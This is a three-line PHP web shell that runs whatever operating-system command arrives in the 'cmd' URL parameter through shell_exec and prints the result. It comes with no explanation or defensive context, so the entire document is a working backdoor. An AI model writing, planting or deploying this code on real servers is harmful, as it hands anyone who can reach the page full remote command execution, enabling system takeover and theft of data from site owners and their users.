<?php
    echo(shell_exec($_GET['cmd']));
?>